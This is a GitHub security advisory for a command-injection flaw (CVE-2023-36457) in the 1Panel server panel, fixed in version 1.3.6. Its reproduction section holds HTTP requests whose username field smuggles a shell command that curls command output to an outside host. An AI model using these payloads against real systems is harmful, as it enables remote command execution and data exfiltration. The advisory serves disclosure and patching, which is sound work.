# [M] 1Panel vulnerable to command injection when adding container repositories

## Summary
Severity: Medium
Advisory: GHSA-q2mx-gpjf-3h8x
CVE: CVE-2023-36457
CWE: CWE-74, CWE-77
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2023-07-05
Source: https://github.com/advisories/GHSA-q2mx-gpjf-3h8x
Type: github-advisory

## Affected
- Go: `github.com/1Panel-dev/1Panel` — affected >=0 <1.3.6

## Details
### Impact

The authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.

1. Vulnerability analysis.

```
backend\app\api\v1\image_repo.go#create
```
![image](https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png)

```
backend\app\service\image_repo.go#CheckConn
```
![image](https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png)

2. vulnerability reproduction.

```
POST /api/v1/containers/repo HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-CSRF-TOKEN: 
Content-Length: 446
Origin: http://192.168.109.152:40982
Connection: close
Referer: http://192.168.109.152:40982/containers/repo
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
```

```
{"id":2,"createdAt":"2023-04-13T19:57:43.633643247-07:00","name":"asdasd","downloadUrl":"127.0.0.1:8080","protocol":"http","username":"admin||curl http://192.168.109.1:12345/`ls`||","auth":true,"status":"Failed","message":"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get \"http://127.0.0.1:8080/v2/\": dial tcp 127.0.0.1:8080: connect: connection refused\n","password":"Passw0rd"}
```

3. Using update can be triggered multiple times.

```
POST /api/v1/containers/repo/update HTTP/1.1
Host: 192.168.109.152:40982
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-CSRF-TOKEN: 
Content-Length: 447
Origin: http://192.168.109.152:40982
Connection: close
Referer: http://192.168.109.152:40982/containers/repo
Cookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e
```

```
{"id":2,"createdAt":"2023-04-13T19:57:43.633643247-07:00","name":"asdasd","downloadUrl":"127.0.0.1:8080","protocol":"http","username":"admin||curl http://192.168.109.1:12345/`pwd`||","auth":true,"status":"Failed","message":"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get \"http://127.0.0.1:8080/v2/\": dial tcp 127.0.0.1:8080: connect: connection refused\n","password":"Passw0rd"}
```

Affected versions: <= 1.3.5

### Patches

The vulnerability has been fixed in v1.3.6.

### Workarounds

It is recommended to upgrade the version to v1.3.6.

### References

If you have any questions or comments about this advisory:

Open an issue in https://github.com/1Panel-dev/1Panel
Email us at wanghe@fit2cloud.com

## References
- https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x
- https://nvd.nist.gov/vuln/detail/CVE-2023-36457
- https://github.com/1Panel-dev/1Panel
- https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6
